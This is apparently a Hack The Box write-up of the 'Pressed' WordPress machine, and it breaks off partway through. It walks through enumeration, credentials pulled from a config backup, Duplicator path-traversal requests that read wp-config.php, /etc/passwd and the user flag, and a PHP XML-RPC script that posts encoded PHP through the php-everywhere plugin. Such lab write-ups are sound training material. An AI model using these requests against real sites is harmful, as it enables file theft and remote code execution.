 # HTB - Pressed

 ## _ENUMERATION_

 ### Adding hostname to /etc/hosts
 ```
 # echo 10.10.11.142 pressed pressed.htb >> /etc/hosts
 #
 ```

 ### NMAP

 _nmap_ identifies single open port on the host, running Apache httpd ver. 2.4.41. 
 ```
# nmap -vv -sC -sV -p- -T4 pressed  -oN pressed.nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 05:59 EST
...
Discovered open port 80/tcp on 10.10.11.142
...
Completed SYN Stealth Scan at 06:02, 160.34s elapsed (65535 total ports)
Initiating Service scan at 06:02
Scanning 1 service on pressed (10.10.11.142)
Completed Service scan at 06:02, 7.36s elapsed (1 service on 1 host)
...
Nmap scan report for pressed (10.10.11.142)
Host is up, received echo-reply ttl 63 (0.075s latency).
Scanned at 2022-02-05 05:59:56 EST for 171s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.9
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
...
Nmap done: 1 IP address (1 host up) scanned in 171.89 seconds
           Raw packets sent: 131184 (5.772MB) | Rcvd: 114 (5.000KB)
```

Visiting http://pressed.htb reveals wordpress powered web site.
![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot1.png)
 
### DIRSEARCH

Fuzzing via dirsearch reveals _.wp-config.php.swp_ file left from editing the configuration, old configuration _wp-config.php.bak_ as well as browsable /uploads/ dicrectory.
```
#  ~/dirsearch/dirsearch.py -u http://pressed.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/dirsearch/reports/pressed.htb/_22-02-05_06-11-49.txt

Error Log: /root/dirsearch/logs/errors-22-02-05_06-11-49.log

Target: http://pressed.htb/

[06:11:50] Starting:
...
[06:11:59] 200 -    4KB - /.wp-config.php.swp
[06:12:42] 301 -    0B  - /index.php  ->  http://pressed.htb/
[06:12:45] 200 -   19KB - /license.txt
[06:13:02] 200 -    7KB - /readme.html
[06:13:05] 403 -  276B  - /server-status/
[06:13:05] 403 -  276B  - /server-status
[06:13:21] 301 -  313B  - /wp-admin  ->  http://pressed.htb/wp-admin/
[06:13:21] 409 -    3KB - /wp-admin/setup-config.php
[06:13:21] 200 -    3KB - /wp-config.php.bak
[06:13:21] 200 -    1KB - /wp-admin/install.php
[06:13:21] 400 -    1B  - /wp-admin/admin-ajax.php
[06:13:21] 200 -    0B  - /wp-content/
[06:13:21] 302 -    0B  - /wp-admin/  ->  http://pressed.htb/wp-login.php?redirect_to=http%3A%2F%2Fpressed.htb%2Fwp-admin%2F&reauth=1
[06:13:21] 301 -  315B  - /wp-content  ->  http://pressed.htb/wp-content/
[06:13:21] 200 -    0B  - /wp-config.php
[06:13:21] 200 -   69B  - /wp-content/plugins/akismet/akismet.php
[06:13:21] 500 -    0B  - /wp-content/plugins/hello.php
[06:13:21] 200 -  775B  - /wp-content/upgrade/
[06:13:21] 200 -    4KB - /wp-content/uploads/
[06:13:21] 301 -  316B  - /wp-includes  ->  http://pressed.htb/wp-includes/
[06:13:21] 200 -    0B  - /wp-cron.php
[06:13:21] 200 -   52KB - /wp-includes/
[06:13:22] 200 -    0B  - /wp-includes/rss-functions.php
[06:13:22] 200 -    6KB - /wp-login.php
[06:13:22] 302 -    0B  - /wp-signup.php  ->  http://pressed.htb/wp-login.php?action=register
[06:13:22] 405 -   42B  - /xmlrpc.php

Task Completed
...
```

### WPSCAN
```
# wpscan --api-token **** --url http://pressed.htb  -e ap,vt,tt,cb,dbe,u1-10,m1-50 --plugins-detection aggressive --plugins-version-detection aggressive --detection-mode aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://pressed.htb/ [10.10.11.142]
[+] Started: Sat Feb  5 06:18:14 2022

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://pressed.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://pressed.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://pressed.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9 identified (Latest, released on 2022-01-25).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://pressed.htb/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="5.9">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://pressed.htb/wp-admin/load-styles.php, Match: '5.9'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:21:42 <========================================================================================================================================================> (96788 / 96788) 100.00% Time: 00:21:42
[+] Checking Plugin Versions (via Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://pressed.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2 (up to date)
 | Last Updated: 2022-01-24T16:11:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/akismet/readme.txt

[+] duplicator
 | Location: http://pressed.htb/wp-content/plugins/duplicator/
 | Last Updated: 2022-02-01T23:53:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.4.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/duplicator/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Duplicator 1.3.24 & 1.3.26 - Unauthenticated Arbitrary File Download
 |     Fixed in: 1.3.28
 |     References:
 |      - https://wpscan.com/vulnerability/35227c3a-e893-4c68-8cb6-ffe79115fb6d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11738
 |      - https://www.exploit-db.com/exploits/49288/
 |      - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
 |      - https://snapcreek.com/duplicator/docs/changelog/?lite
 |      - https://snapcreek.com/duplicator/docs/changelog/
 |      - https://cxsecurity.com/issue/WLB-2021010001
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/duplicator/readme.txt

[+] miniorange-2-factor-authentication
 | Location: http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/
 | Latest Version: 5.4.51 (up to date)
 | Last Updated: 2022-01-27T07:02:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/, status: 200
 |
 | Version: 5.4.51 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/miniorange-2-factor-authentication/readme.txt

[+] php-everywhere
 | Location: http://pressed.htb/wp-content/plugins/php-everywhere/
 | Last Updated: 2022-01-10T23:05:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/php-everywhere/readme.txt
 | [!] The version is out of date, the latest version is 3.0.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/php-everywhere/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: PHP Everywhere < 2.0.3 - Arbitrary Settings Update via CSRF
 |     Fixed in: 2.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/77006954-3b7c-4157-8ea4-867b59883558
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23227
 |      - https://plugins.trac.wordpress.org/changeset/2648829
 |
 | Version: 1.2.5 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/php-everywhere/readme.txt

[+] relative-url
 | Location: http://pressed.htb/wp-content/plugins/relative-url/
 | Latest Version: 0.1.8 (up to date)
 | Last Updated: 2021-08-11T18:45:00.000Z
 | Readme: http://pressed.htb/wp-content/plugins/relative-url/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/relative-url/, status: 200
 |
 | Version: 0.1.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/relative-url/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://pressed.htb/wp-content/plugins/relative-url/readme.txt

[+] Enumerating Vulnerable Themes (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:06 <============================================================================================================================================================> (400 / 400) 100.00% Time: 00:00:06

[i] No themes Found.

[+] Enumerating Timthumbs (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:34 <==========================================================================================================================================================> (2568 / 2568) 100.00% Time: 00:00:34

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:03

[i] Config Backup(s) Identified:

[!] http://pressed.htb/wp-config.php.bak
 | Found By: Direct Access (Aggressive Detection)

[+] Enumerating DB Exports (via Aggressive Methods)
 Checking DB Exports - Time: 00:00:01 <===================================================================================================================================================================> (71 / 71) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[+] Enumerating Medias (via Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <==========================================================================================================================================================> (50 / 50) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://pressed.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 6
 | Requests Remaining: 19

[+] Finished: Sat Feb  5 06:41:15 2022
[+] Requests Done: 100102
[+] Cached Requests: 9
[+] Data Sent: 26.582 MB
[+] Data Received: 13.658 MB
[+] Memory used: 407.645 MB
[+] Elapsed time: 00:23:01
```

## _ACCESS TO WORDPRESS INSTALLATION_

# Finding username, password, and access to user flag - Method 1

Downloading and analyzing configuration backup found by both _dirseach_ and _wpscan_
```
# less wp-config.php.bak
...

...
/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Login with username _admin_ and password _uhc-jan-finals-2021_ is not successfull.
![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot2.png)
Changing the password to _uhc-jan-finals-2022_ confirms that it is correct. However admin panel is protected with OTP.
![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot2.png)

As we have confirmed username and password and we can directly access xmlrpc.php (confirmed by _wpscan_) we can try to enumerate supported methods. Good resource can be found at https://codex.wordpress.org/XML-RPC
In _BURP_ repeater
```
POST /xmlrpc.php HTTP/1.1
Host: pressed.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```
Response:
```
HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 16:07:04 GMT
Server: Apache/2.4.41 (Ubuntu)
Connection: close
Vary: Accept-Encoding
Content-Length: 4319
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>htb.get_flag</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

One method that immediately pops up is _htb.get_flag_
Calling it:
```
POST /xmlrpc.php HTTP/1.1
Host: pressed.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

<methodCall>
  <methodName>htb.get_flag</methodName>
  <params></params>
</methodCall>
```
And we have captured the user flag:
```
HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 16:09:47 GMT
Server: Apache/2.4.41 (Ubuntu)
Connection: close
Vary: Accept-Encoding
Content-Length: 208
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <string>4e62f9213327d3...
</string>
      </value>
    </param>
  </params>
</methodResponse>

```

# Finding username, password, and access to user flag - Method 2

Using _CVE-2020-11738_ vulnerability in Duplicator - Unauthenticated Arbitrary File Download. A good write-up can be found at https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/ . There is also a metasploit module _auxiliary/scanner/http/wp_duplicator_file_read_ , also available at https://www.exploit-db.com/exploits/49288 with EDB: 49288

Gaining access to current wp-config.php using _BURP_:
```
GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php HTTP/1.1
Host: pressed.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close
```
Response:
```
HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 16:18:01 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Description: File Transfer
Content-Disposition: attachment; filename="wp-config.php"
Expires: 0
Cache-Control: must-revalidate
Pragma: public
Content-Length: 3194
Connection: close
Content-Type: application/octet-stream

<?php
...
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2022' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
...
```

Again, we try to login as user _admin_ and password _uhc-jan-finals-2022_ we can confirm the validity of the username/password pair, but we are asked for an OTP code.
Access to /etc/passwd
```
GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../etc/passwd HTTP/1.1
Host: pressed.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close
```
Reveals username _htb_ present on the host:
```
HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 16:20:26 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Description: File Transfer
Content-Disposition: attachment; filename="passwd"
Expires: 0
Cache-Control: must-revalidate
Pragma: public
Content-Length: 1816
Connection: close
Content-Type: application/octet-stream

...
htb:x:1000:1000:htb:/home/htb:/bin/bash
...
```

Flag capture:
```
GET /wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../home/htb/user.txt HTTP/1.1
Host: pressed.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close
```
```
HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 16:22:25 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Description: File Transfer
Content-Disposition: attachment; filename="user.txt"
Expires: 0
Cache-Control: must-revalidate
Pragma: public
Content-Length: 33
Connection: close
Content-Type: application/octet-stream

4e62f9213327d3...
```

# REMOTE CODE EXECUTION VIA _php-everywhere_ PLUGIN

Checking out _php_everywhere_ readme:
```
=== PHP Everywhere ===
Contributors: alexander_fuchs 
Donate link:http://www.alexander-fuchs.net/donate/
Tags: code,html,php,post,page,widget,insert PHP,custom code,insert PHP page,insert PHP post,run PHP,use PHP,execphp,block
Requires at least: 5.0
Tested up to: 5.8.2
Requires PHP: 5.6
Stable tag: trunk
License: GPL2
License URI: http://www.gnu.de/documents/gpl-2.0.de.html

This plugin enables PHP code everywhere in your WordPress instalation.

Using this plugin you can use PHP in the sidebar, pages and posts. Supports Gutenberg.
```

The ability to run php code everywhere, especially in posts, seems interesting, since we already have:
- administrator username and password
- access to xmlrpc.php
- wp.newPost method

We will use _php-ixr_ library from _Incutio_ (download at https://code.google.com/archive/p/php-ixr/downloads) and some simple php code. 
```
<?php
include('IXR_Library.php');
$usr = 'admin';
$pwd = 'uhc-jan-finals-2022';
$xmlrpc = 'http://pressed.htb/xmlrpc.php';
$client = new IXR_Client($xmlrpc);
$client -> debug = true;
$params = array(
    'post_type' => 'post',
    'post_status' => 'publish',
    'post_title' => 'title',
    'post_author' => 1,
    'mt_keywords' => 'keywords',
    'categories' => 'categories',
    'post_content' => '<?php phpinfo(); ?>'
);
$res = $client -> query('wp.newPost',1, $usr, $pwd, $params);
?>
```
Create the new post:
```
# php upload.php
PHP Warning:  Module 'xmlrpc' already loaded in Unknown on line 0
<pre class="ixr_request">POST /xmlrpc.php HTTP/1.0
Host: pressed.htb
Content-Type: text/xml
User-Agent: The Incutio XML-RPC PHP Library
Content-Length: 897

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;wp.newPost&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;uhc-jan-finals-2022&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;struct&gt;
  &lt;member&gt;&lt;name&gt;post_type&lt;/name&gt;&lt;value&gt;&lt;string&gt;post&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_status&lt;/name&gt;&lt;value&gt;&lt;string&gt;publish&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_title&lt;/name&gt;&lt;value&gt;&lt;string&gt;title&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_author&lt;/name&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;mt_keywords&lt;/name&gt;&lt;value&gt;&lt;string&gt;keywords&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;categories&lt;/name&gt;&lt;value&gt;&lt;string&gt;categories&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;post_content&lt;/name&gt;&lt;value&gt;&lt;string&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;
&lt;/params&gt;&lt;/methodCall&gt;
</pre>

<pre class="ixr_response">HTTP/1.1 200 OK
Date: Sat, 05 Feb 2022 16:50:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Connection: close
Vary: Accept-Encoding
Content-Length: 177
Content-Type: text/xml; charset=UTF-8

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
      &lt;string&gt;47&lt;/string&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;

</pre>
```
Visiting the front page we can see that our new post is successfully created and published.

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot4.png)

However php code is not executed. Time for a little research.

![](https://github.com/nikip72/HTB/raw/main/Pressed/screenshot5.png)

Using local wordpress instance we create a simple page using _php-everywhere block_ and _phpinfo();_ as code, publish the page and then check the source from the db:
```
mysql> select * from wp_posts where post_content like "%everywhere%"\G
...
ID: 8587
post_author: 3
...
post_content: <!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwcGhwaW5mbygpJTNCJTIwJTNGJTNF","version":"3.0.0"} /-->
post_title: TEST PAGE
...
```

Content in the block is _base64_ and _url_ encoded:
```
# hURL -b  "JTNDJTNGcGhwJTIwcGhwaW5mbygpJTNCJTIwJTNGJTNF"
Original string       :: JTNDJTNGcGhwJTIwcGhwaW5mbygpJTNCJTIwJTNGJTNF
base64 DEcoded string :: %3C%3Fphp%20phpinfo()%3B%20%3F%3E

# hURL -d '%3C%3Fphp%20phpinfo()%3B%20%3F%3E'
Original      :: %3C%3Fphp%20phpinfo()%3B%20%3F%3E
2xURL DEcoded :: <?php phpinfo(); ?>
```

Let's create and publish another post with the php code from the local wordpress instance:
```
<?php
include('IXR_Library.php');
$usr = 'admin';
$pwd = 'uhc-jan-finals-2022';
$xmlrpc = 'http://pressed.htb/xmlrpc.php';
$client = new IXR_Client($xmlrpc);
$client -> debug = true;
$params = array(
    'post_type' => 'post',
    'post_status' => 'publish',
    'post_title' => 'title',
    'post_author' => 1,
    'mt_keywords' => 'keywords',
    'categories' => 'categories',
    'post_content' => '<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwcGhwaW5mbygpJTNCJTIwJTNGJTNF","version":"3.0.0"} /-->'
);
$res = $client -> query('wp.newPost',1, $usr, $pwd, $params);
?>
```
```
# php upload.php
PHP Warning:  Module 'xmlrpc' already loaded in Unknown on line 0
<pre class="ixr_request">POST /xmlrpc.php HTTP/1.0
Host: pressed.htb
Content-Type: text/xml
User-Agent: The Incutio XML-RPC PHP Library
Content-Length: 1029

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;wp.newPost&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;&lt;value&gt;&lt;int&gt;1&lt;/int&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;string&gt;uhc-jan-finals-2022&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
&lt;param&gt;&lt;value&gt;&lt;struct&gt;
  &lt;member&gt;&lt;name&gt;post_type&lt;/name&gt;&lt;value&gt;&lt;string&gt;post&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
